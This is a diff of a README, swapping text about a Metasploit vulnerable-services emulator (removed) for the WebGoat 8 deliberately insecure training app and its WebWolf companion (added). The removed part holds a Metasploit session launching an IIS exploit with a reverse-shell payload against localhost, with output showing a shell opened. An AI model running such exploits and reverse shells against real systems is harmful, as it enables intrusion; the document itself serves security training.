@@ -1,123 +1,205 @@
-# Metasploit Vulnerable Services Emulator
+# WebGoat 8: A deliberately insecure Web Application
 
-   Many IT professionals and engineers want to learn security because it's such a hot field right now.  There are many free tools 
-out there, one of the most famous is Metasploit.  An obvious route to teach oneself about security is to download Metasploit and
-play with it. However, without vulnerable services to test again, it's hard to play with Metasploit. 
+[![Build Status](https://travis-ci.org/WebGoat/WebGoat.svg?branch=develop)](https://travis-ci.org/WebGoat/WebGoat)
+[![Coverage Status](https://coveralls.io/repos/WebGoat/WebGoat/badge.svg?branch=develop&service=github)](https://coveralls.io/github/WebGoat/WebGoat?branch=master)
+[![Codacy Badge](https://api.codacy.com/project/badge/b69ee3a86e3b4afcaf993f210fccfb1d)](https://www.codacy.com/app/dm/WebGoat)
+[![Dependency Status](https://www.versioneye.com/user/projects/562da95ae346d7000e0369aa/badge.svg?style=flat)](https://www.versioneye.com/user/projects/562da95ae346d7000e0369aa)
+[![OWASP Labs](https://img.shields.io/badge/owasp-lab%20project-f7b73c.svg)](https://www.owasp.org/index.php/OWASP_Project_Inventory#tab=Labs_Projects) 
+[![GitHub release](https://img.shields.io/github/release/WebGoat/WebGoat.svg)](https://github.com/WebGoat/WebGoat/releases/latest) 
 
-   The tool is created to emulate vulnerable services for the purpose of 
-* test Metasploit modules.  
-* help with training on Metasploit. 
+# Introduction
 
-   It runs on Linux (Ubuntu), windows platform (hopefully Mac OSX). Currently it supports over 100 emulated vulnerable services,
-we will keep adding more to cover as many of the 1000+ modules in Metasploit as possible. 
+WebGoat is a deliberately insecure web application maintained by [OWASP](http://www.owasp.org/) designed to teach web
+application security lessons.
 
-# Key feature
+This program is a demonstration of common server-side application flaws. The
+exercises are intended to be used by people to learn about application security and
+penetration testing techniques.
 
-  To make it easy to add a new emulated service, we have designed it to be language independent: the service emulation is 
-in JSON format, one can add/remove/edit a service in JSON very quickly
+**WARNING 1:** *While running this program your machine will be extremely
+vulnerable to attack. You should disconnect from the Internet while using
+this program.*  WebGoat's default configuration binds to localhost to minimize
+the exposure.
 
-  A minor but interesting feature is that we make it easy to create SSL socket, all TCP sockets can automatically upgrade to SSL. 
+**WARNING 2:** *This program is for educational purposes only. If you attempt
+these techniques without authorization, you are very likely to get caught. If
+you are caught engaging in unauthorized hacking, most companies will fire you.
+Claiming that you were doing security research will not work as that is the
+first thing that all hackers claim.*
 
-# Quick run
+# Installation Instructions:
 
-Note that the commands typed on the shell session spawned are actually executed on the target, so please run this emulator in a safe environment if you don't want it to be owned :-)
+## 1. Standalone 
 
-You may have to install the following packages depending on your environment: IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable.
-On my Ubuntu, they can be installed as
-```
-sudo cpanm install IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable JSON
-```
+Download the latest WebGoat release from [https://github.com/WebGoat/WebGoat/releases](https://github.com/WebGoat/WebGoat/releases)
 
-On vulnerability Emulator:
-```
-perl vulEmu.pl
->>activate exploits/windows/iis/ms01_023_printer
-
-```
-on Metasploit console:
-```
-msf > use exploit/windows/iis/ms01_023_printer
-msf > set payload windows/shell_reverse_tcp
-msf > setg RHOST 127.0.0.1
-msf > setg LHOST 127.0.0.1
-msf exploit(ms01_023_printer) > run
-
-[*] Started reverse TCP handler on 127.0.0.1:4444 
-[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:51852) at 2017-01-20 10:47:12 -0600
-
->>ls
-README.md
-secret.txt
-server_cert.pem
-server_key.pem
-service.cfg
-vulEmu.pl
-
+```Shell
+java -jar webgoat-server-8.0.0.VERSION.jar [--server.port=8080] [--server.address=localhost]
 ```
 
-# Run it with Docker
+The latest version of WebGoat needs Java 11. By default WebGoat starts on port 8080 with `--server.port` you can specify a different port. With `server.address` you
+can bind it to a different address (default localhost)
 
-If you want to run the above example in a container environment with docker, just run:
 
-```
-docker run --rm -it -p 80:80 vulnerables/metasploit-vulnerability-emulator
-```
+## 2. Run using Docker
 
-Then you will be presented to the very same shell, if you don't have docker installed, just follow the instructions [here](https://docker.com).
+Every release is also published on [DockerHub]((https://hub.docker.com/r/webgoat/webgoat-8.0/)).
 
-Remember, you have to map the port that you want addding a `-p external-port:internal-port` argument. To map all ports present in service.cfg, please run this command:
+### Using docker-compose
 
-```
-docker run --rm -it \
-       -p 20:20 -p 21:21 -p 80:80 -p 443:443 -p 4848:4848 \
-       -p 6000:6000 -p 6060:6060 -p 7000:7000 -p 7181:7181 \
-       -p 7547:7547 -p 8000:8000 -p 8008:8008 -p 8020:8020 \
-       -p 8080:8080 -p 8400:8400 \
-       vulnerables/metasploit-vulnerability-emulator
+The easiest way to start WebGoat as a Docker container is to use the `docker-compose.yml` [file](https://raw.githubusercontent.com/WebGoat/WebGoat/develop/docker-compose.yml) 
+from our Github repository. This will start both containers and it also takes care of setting up the
+connection between WebGoat and WebWolf.
+
+```shell
+curl https://raw.githubusercontent.com/WebGoat/WebGoat/develop/docker-compose.yml | docker-compose -f - up
 ```
 
-# Developer overview
+**Important**: the current directory on your host will be mapped into the container for keeping state.
+
+Using the `docker-compose` file will simplify getting WebGoat and WebWolf up and running.
 
 
-The software has two parts
+## 3. Run from the sources
 
-* Server/service emulation description file in JSON  (service.cfg)
-* Interpreter (currently implemented in perl, but it can be done with other languages too)
+### Prerequisites:
 
-Here is a quick example from part of the service emulation description file, for the Metasploit module exploit/multi/http/tomcat_mgr_deploy.
+* Java 11
+* Maven > 3.2.1
+* Your favorite IDE
+* Git, or Git support in your IDE
 
+Open a command shell/window:
 
-```
-	"exploit/multi/http/tomcat_mgr_deploy" : {
-		"defaultPort": [80],
-		"seq": [
-			["substr", "GET \/manager\/serverinfo"],
-			["HTTP/1.0 200 OK\r\nContent-Length: $\r\n\r\n", "!!OS Name: Linux\nOS Architecture: x86_64"],
-			["starts", "PUT /manager/deploy?path="],
-			["HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", {
-				"connect": "127.0.0.1:4444"
-			}]
-		]
-	},
+```Shell
+git clone git@github.com:WebGoat/WebGoat.git
 ```
 
- The most important part is the "seq" array. it always has even number of entries.  When a message is received, it's compared
-to the entries 0, 2, 4 ... Once a match is found, it will execute the entry immediately after it.  For example, if an entry
-matches with entry 2, it will execute the statements in entry 3. 
+Now let's start by compiling the project.
 
- The matching entries have the matching actions such as
+```Shell
+cd WebGoat
+git checkout <<branch_name>>
+mvn clean install
+```
 
-* **substr**:  do a substring match
-* **regex**:   do a regular expression match
-* **starts**:  check if incoming message starts with the string in the entry
+Now we are ready to run the project. WebGoat 8.x is using Spring-Boot.
 
-  The execution entry itself can have multiple entries. Each entry can be just a string, an array or dictionary. strings and arrays
-are used to build the response message (by concatentation).  For an array, it has a few elements, the first element is action type,
-such as
+```Shell
+mvn -pl webgoat-server spring-boot:run
+```
+... you should be running webgoat on localhost:8080/WebGoat momentarily
 
-* **repeat**:  return a string after repeating the string (second element) by the certain number of times specified by the third element.
-* **nsize**:   return the size of the element
-* **gzip**:    return the gzipped content
-   
-   It can also do compacting of string into binary data, such as  ["N", 123] which will compact the number 123 into big-endean 
-4-byte integer.
+
+To change IP address add the following variable to WebGoat/webgoat-container/src/main/resources/application.properties file
+
+```
+server.address=x.x.x.x
+```
+
+# Vagrant
+
+We supply a complete environment using Vagrant, to run WebGoat with Vagrant you must first have Vagrant and Virtualbox installed.
+
+```shell
+   $ cd WebGoat/webgoat-images/vagrant-training
+   $ vagrant up
+```
+
+Once the provisioning is complete login to the Virtualbox with username vagrant and password vagrant.
+WebGoat and WebWolf will automatically start when you login to this image.
+
+
+# Building a new Docker image
+
+NOTE: Travis will create a new Docker image automatically when making a new release.
+
+WebGoat now has Docker support for x86 and ARM (raspberry pi).
+### Docker on x86
+On x86 you can build a container with the following commands:
+
+```Shell
+cd WebGoat/
+mvn install
+cd webgoat-server
+docker build -t webgoat/webgoat-8.0 .
+docker tag webgoat/webgoat-8.0 webgoat/webgoat-8.0:8.0
+docker login
+docker push webgoat/webgoat-8.0
+```
+
+### Docker on ARM (Raspberry Pi)
+On a Raspberry Pi (it has yet been tested with a Raspberry Pi 3 and the hypriot Docker image) you need to build JFFI for
+ARM first. This is needed by the docker-maven-plugin ([see here](https://github.com/spotify/docker-maven-plugin/issues/233)):
+
+```Shell
+sudo apt-get install build-essential
+git clone https://github.com/jnr/jffi.git
+cd jffi
+ant jar
+cd build/jni
+sudo cp libjffi-1.2.so /usr/lib
+```
+
+When you have done this you can build the Docker container using the following commands:
+
+```Shell
+cd WebGoat/
+mvn install
+cd webgoat-server
+mvn docker:build -Drpi=true
+docker tag webgoat/webgoat-8.0 webgoat/webgoat-8.0:8.0
+docker login
+docker push webgoat/webgoat-8.0
+```
+
+# Run Instructions:
+
+Once installed connect to http://localhost:8080/WebGoat and http://localhost:9090/WebWolf
+
+# WebWolf
+
+## Introduction
+
+During workshops one of the feedback items was that in some lesson it was not clear what you controlled 
+as an attacker and what was part of the lesson. To make this separation more distinct we created 
+WebWolf which is completely controlled by you as the attacker and runs as a separate application. 
+
+Instead of using your own machine which would involve WebGoat being connected to your local network
+or internet (remember WebGoat is a vulnerable webapplication) we created WebWolf which is the the 
+environment for you as an attacker.
+
+At the moment WebWolf offers support for:
+
+- Receiving e-mails
+- Serving files
+- Logging of incoming requests (cookies etc)
+
+# Run instructions
+
+## 1. Run using Docker
+
+If you use the Docker image of WebGoat this application will automatically be available. Use the following 
+URL: http://localhost:9090/WebWolf
+
+## 2. Standalone
+
+```Shell
+cd WebGoat
+git checkout develop
+mvn clean install
+```
+
+Now we are ready to run the project. WebGoat 8.x is using Spring-Boot.
+
+```Shell
+mvn -pl webwolf spring-boot:run
+```
+... you should be running WebWolf on localhost:9090/WebWolf momentarily
+
+
+
+### Mapping
+
+The web application runs on '/' and the controllers and Thymeleaf templates are hardcoded to '/WebWolf' we need
+to have '/' available which acts as a landing page for incoming requests.
